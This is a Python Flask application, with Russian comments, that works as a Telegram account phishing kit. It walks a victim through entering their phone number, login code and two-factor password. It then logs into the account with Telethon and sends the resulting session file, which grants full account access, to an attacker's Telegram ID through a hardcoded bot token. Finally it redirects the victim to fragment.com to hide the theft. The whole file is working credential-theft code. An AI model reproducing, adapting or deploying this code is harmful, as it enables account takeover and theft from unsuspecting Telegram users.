import os
import asyncio
import base64
import uuid
import requests
from flask import Flask, render_template, request, redirect, url_for, session, flash
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'dev-key-change-me')

API_ID = int(os.environ.get('API_ID', 0))
API_HASH = os.environ.get('API_HASH', '')
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8222821127:AAEE-jlLDXQ9XOgT5ni1DbRC0eSd06KIKZU')

if not API_ID or not API_HASH:
    raise ValueError("API_ID and API_HASH must be set in environment variables")

# Хранилище активных клиентов Telethon (ключ = session_id)
clients = {}

# ---- Вспомогательные функции для работы с Telethon (асинхронные) ----
async def create_client(session_name):
    client = TelegramClient(session_name, API_ID, API_HASH)
    await client.connect()
    return client

async def send_code_request(phone, client):
    result = await client.send_code_request(phone)
    return result.phone_code_hash

async def sign_in_with_code(phone, code, phone_code_hash, client):
    try:
        await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
        return True, False, None
    except SessionPasswordNeededError:
        return True, True, None
    except PhoneCodeInvalidError:
        return False, False, "Неверный код. Попробуйте снова."
    except FloodWaitError as e:
        return False, False, f"Слишком много попыток. Подождите {e.seconds} секунд."
    except Exception as e:
        return False, False, str(e)

async def sign_in_with_password(password, client):
    try:
        await client.sign_in(password=password)
        return True, None
    except Exception as e:
        return False, str(e)

async def disconnect_client(client):
    await client.disconnect()

# ---- Отправка файла сессии через бота ----
def send_session_file(session_name, target_user_id):
    file_path = f"{session_name}.session"
    if not os.path.exists(file_path):
        return False
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    with open(file_path, 'rb') as f:
        files = {'document': f}
        data = {'chat_id': target_user_id}
        response = requests.post(url, files=files, data=data)
    os.remove(file_path)
    return response.ok

# ---- Маршруты ----
@app.route('/<base64_id>')
def index(base64_id):
    """Страница ввода номера телефона"""
    # Генерируем или получаем session_id для этого браузера
    if 'session_id' not in session:
        session['session_id'] = str(uuid.uuid4())
    session_name = f"session_{session['session_id']}"

    # Если клиент ещё не создан, создаём его и сохраняем
    if session['session_id'] not in clients:
        try:
            client = asyncio.run(create_client(session_name))
            clients[session['session_id']] = client
        except Exception as e:
            flash(f"Ошибка подключения: {e}")
            return redirect(url_for('index', base64_id=base64_id))

    return render_template('index.html', base64_id=base64_id)

@app.route('/<base64_id>/send_code', methods=['POST'])
def send_code(base64_id):
    """Обработка номера, отправка кода"""
    if 'session_id' not in session:
        return redirect(url_for('index', base64_id=base64_id))

    country_code = request.form.get('country_code')
    phone_number = request.form.get('phone_number')
    if not country_code or not phone_number:
        flash("Введите номер телефона")
        return redirect(url_for('index', base64_id=base64_id))

    full_phone = '+' + country_code + phone_number

    client = clients.get(session['session_id'])
    if not client:
        flash("Сессия устарела, начните заново")
        return redirect(url_for('index', base64_id=base64_id))

    try:
        phone_code_hash = asyncio.run(send_code_request(full_phone, client))
        session['phone'] = full_phone
        session['phone_code_hash'] = phone_code_hash
        # Убираем флаг пароля, если был
        session.pop('need_password', None)
        return redirect(url_for('verify_code', base64_id=base64_id))
    except Exception as e:
        flash(f"Ошибка при отправке кода: {e}")
        return redirect(url_for('index', base64_id=base64_id))

@app.route('/<base64_id>/verify_code', methods=['GET', 'POST'])
def verify_code(base64_id):
    """Страница ввода кода"""
    if 'session_id' not in session or 'phone' not in session:
        return redirect(url_for('index', base64_id=base64_id))

    if request.method == 'GET':
        return render_template('code.html', base64_id=base64_id)

    # POST: проверка кода
    code = request.form.get('code')
    if not code:
        flash("Введите код")
        return redirect(url_for('verify_code', base64_id=base64_id))

    client = clients.get(session['session_id'])
    if not client:
        flash("Сессия утеряна, начните заново")
        return redirect(url_for('index', base64_id=base64_id))

    phone = session['phone']
    phone_code_hash = session['phone_code_hash']

    success, need_password, error = asyncio.run(
        sign_in_with_code(phone, code, phone_code_hash, client)
    )

    if error:
        flash(error)
        return redirect(url_for('verify_code', base64_id=base64_id))

    if need_password:
        session['need_password'] = True
        return redirect(url_for('password', base64_id=base64_id))

    # Успешный вход без пароля
    return finalize_login(base64_id, session['session_id'])

@app.route('/<base64_id>/password', methods=['GET', 'POST'])
def password(base64_id):
    """Страница ввода пароля двухфакторки"""
    if 'session_id' not in session or 'need_password' not in session:
        return redirect(url_for('index', base64_id=base64_id))

    if request.method == 'GET':
        return render_template('password.html', base64_id=base64_id)

    # POST: проверка пароля
    password = request.form.get('password')
    if not password:
        flash("Введите пароль")
        return redirect(url_for('password', base64_id=base64_id))

    client = clients.get(session['session_id'])
    if not client:
        flash("Сессия утеряна, начните заново")
        return redirect(url_for('index', base64_id=base64_id))

    success, error = asyncio.run(sign_in_with_password(password, client))
    if not success:
        flash(f"Ошибка пароля: {error}")
        return redirect(url_for('password', base64_id=base64_id))

    # Успешный вход с паролем
    return finalize_login(base64_id, session['session_id'])

def finalize_login(base64_id, session_id):
    """Завершение входа: отправка файла и редирект"""
    # Декодируем base64_id в числовой ID пользователя
    try:
        target_user_id = int(base64.b64decode(base64_id).decode())
    except Exception:
        flash("Неверная ссылка")
        return redirect(url_for('index', base64_id=base64_id))

    session_name = f"session_{session_id}"
    client = clients.get(session_id)

    # Отключаем клиента (сохраняем сессию)
    if client:
        asyncio.run(disconnect_client(client))
        del clients[session_id]

    # Отправляем файл сессии ботом
    if not send_session_file(session_name, target_user_id):
        flash("Не удалось отправить файл сессии, но вход выполнен.")

    # Очищаем сессию Flask
    session.clear()

    # Редирект на fragment.com
    return redirect("https://fragment.com")

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
